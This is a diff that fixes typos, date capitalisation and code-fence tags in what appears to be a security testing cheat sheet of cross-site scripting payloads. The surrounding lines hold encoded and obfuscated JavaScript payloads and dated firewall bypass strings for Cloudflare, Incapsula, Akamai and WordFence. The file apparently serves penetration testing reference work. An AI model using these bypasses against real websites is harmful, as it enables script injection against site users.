@@ -227,7 +227,7 @@ javascript:prompt(1)
 
 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
 
-We can encode the "javacript:" in Hex/Octal
+We can encode the "javascript:" in Hex/Octal
 \x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 \u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
@@ -824,7 +824,7 @@ javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!�
 
 ### Bypass using Lontara
 
-```javscript
+```javascript
 ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
 ```
 
@@ -997,25 +997,25 @@ Works for CSP like `script-src 'self' data:`
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
 
-#### 21st april 2020
+#### 21st April 2020
 
 ```html
 <svg/OnLoad="`${prompt``}`">
 ```
 
-#### 22nd august 2019
+#### 22nd August 2019
 
 ```html
 <svg/onload=%26nbsp;alert`bohdan`+
 ```
 
-#### 5th jule 2019
+#### 5th June 2019
 
 ```html
 1'"><img/src/onerror=.1|alert``>
 ```
 
-#### 3rd june 2019
+#### 3rd June 2019
 
 ```html
 <svg onload=prompt%26%230000000040document.domain)>
@@ -1023,19 +1023,19 @@ Works for CSP like `script-src 'self' data:`
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```
 
-### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)
+### Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)
 
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
 
-### Cloudflare XSS Bypass - 27th february 2018
+### Cloudflare XSS Bypass - 27th February 2018
 
 ```html
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
 ```
 
-### Chrome Auditor - 9th august 2018
+### Chrome Auditor - 9th August 2018
 
 ```javascript
 </script><svg><script>alert(1)-%26apos%3B
@@ -1043,7 +1043,7 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 
 Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march 2018
+### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018
 
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -1051,31 +1051,31 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september 2018
+### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018
 
 ```javascript
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 
-### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th may 2019
+### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019
 
 ```html
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 ```
 
-### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june 2018
+### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
-### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october 2018
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018
 
 ```html
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 ```
 
-### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september 2018
+### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018
 
 ```javascript
 <a href=javas&#99;ript:alert(1)>
@@ -1118,7 +1118,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)](http://mksben.l0.cm/2016/07/xxn-caret.html) by Masato Kinugawa
 - [Youtube XSS](https://labs.detectify.com/2015/06/06/google-xss-turkey/) by fransrosen
 - [Best Google XSS again](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) - by Krzysztof Kotowicz
-- [IE & Edge URL parsin Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
+- [IE & Edge URL parsing Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
 - [Google XSS subdomain Clickjacking](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
 - [Microsoft XSS and Twitter XSS](http://blog.wesecureapp.com/xss-by-tossing-cookies/)
 - [Google Japan Book XSS](http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/)
